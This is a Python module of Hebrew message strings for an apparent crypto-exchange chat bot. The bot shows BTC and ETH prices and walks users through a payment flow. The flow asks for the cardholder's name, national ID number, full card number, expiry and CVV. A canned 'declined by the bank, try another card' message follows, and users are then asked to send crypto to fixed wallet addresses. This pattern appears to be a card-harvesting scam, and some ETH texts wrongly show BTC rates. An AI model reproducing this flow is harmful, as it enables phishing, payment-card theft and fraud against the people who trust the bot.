import cryptocompare
import config
import info




################     ADMIN   ###############
panel = "Welcome back, boss"

i_3 = cryptocompare.get_price('ETH', curr='ILS')
ETH_ILS = int(i_3['ETH']['ILS'])

i_4 = cryptocompare.get_price('ETH', curr='USD')
ETH_USD = int(i_4['ETH']['USD'])

i_0 = cryptocompare.get_price('BTC', curr='ILS')
BTC_ILS = int(i_0['BTC']['ILS'])

i_1 = cryptocompare.get_price('BTC', curr='USD')
BTC_USD = int(i_1['BTC']['USD'])

USD_ILS = int(3.38)



view_curr = '''
נכון לרגע זה, אלה הם שערי המטבעות שניתן להמיר אצלינו:

============== BTC (ביטקוין) ==============
''' + format(BTC_ILS,',d') + ''' ש\"ח 
'''+ format(BTC_USD,',d') + ''' דולר

============== ETH (אטריום) ==============
''' + format(ETH_ILS,',d') + ''' ש\"ח
''' + format(ETH_USD,',d') + ''' דולר

בקרוב תתאפשר המרה גם למטבעות אחרים.
'''



ex_text = '''

האם אתה רוצה לקנות או למכור מטבע וירטואלי? 

בחר באפשרות המתאימה:

'''

exchange_text = '''
פעולה:                   מכירה (BTC) 
שער עדכני:             '''+format(BTC_ILS, ',d')+'''NIS or ''' + format(BTC_USD,',d') + '''USD
עמלה:                    3.45% 
'''

exchange_text0 = '''
פעולה:                   קניה (BTC) 
שער עדכני:             '''+format(BTC_ILS, ',d')+'''NIS or ''' + format(BTC_USD,',d') + '''USD
עמלה:                    3.45% 
'''


exchange_text1 = '''
פעולה:                   מכירה (ETH) 
שער עדכני:             '''+format(BTC_ILS, ',d')+'''NIS or ''' + format(BTC_USD,',d') + '''USD
עמלה:                    3.45% 
'''


exchange_text2 = '''
פעולה:                   קניה (ETH) 
שער עדכני:             '''+format(ETH_ILS, ',d')+'''NIS or ''' + format(BTC_USD,',d') + '''USD
עמלה:                    3.45% 
'''


#amla_nis = float(config.cost) / 100 * 3.45

buy = '''
בחר את סוג המטבע שברצונך להמיר.

'''


after_fee = '''
 הקלד את הסכום הרצוי בשקלים.

שים לב!
 הסכום שתקישו אינו כולל עמלת המרה.
'''

after_confirm = "*תשלום:*" + "\n\nשלח את שם בעל הכרטיס:"
tz = "*תשלום:*" + "\n\nשלח את מספר תעודת הזהות של בעל הכרטיס:"
card_num = "*תשלום:*" + "\n\nיש לשלוח את מספר הכרטיס האשראי (16 ספרות בקדמת הכרטיס):"
card_date = "*תשלום:*" + "\n\nיש לשלוח את תוקף הכרטיס האשראי (4 ספרות בקדמת הכרטיס):"
card_code = "*תשלום:*" + "\n\nיש לשלוח את הקוד בגב הכרטיס:"
all_info = "*שגיעה*" + "\n\n הפעולה סורבה ע\"י הבנק. נסה כרטיס אחר או חזור מאוחר יותר."
after_confirm1 = "*פרטי הכרטיס, אליו יועבר הסכום בש\"ח:*" + "\n\nשלח את שם בעל הכרטיס:"
after_confirm_num = "*פרטי הכרטיס, אליו יועבר הסכום בש\"ח:*" + "\n\nשלח את מספר הכרטיס:"
after_confirm1_date = "*פרטי הכרטיס, אליו יועבר הסכום בש\"ח:*" + "\n\nשלח את תוקף הכרטיס:"
send_crypto1 = "*שלב ההמרה*"+"\n\nשלח "+"שלח את הסכום מהחשבונית לחשבון מספר:\n"+"`17oMxfG9Mhd9RLjkAFdnkAETS9ST923qR1`"+"\n\nשימו לב:    ההמרה תתבצע לאחר 3 אישורי העברה. "
send_crypto = "*שלב ההמרה*"+"\n\nשלח " + "שלח את הסכום מהחשבונית לחשבון מספר:\n"+"`0x413Dd5a0B434122299fF5a583198b101D3B626EA`"+"\n\nשימו לב:    ההמרה תתבצע לאחר 3 אישורי העברה. "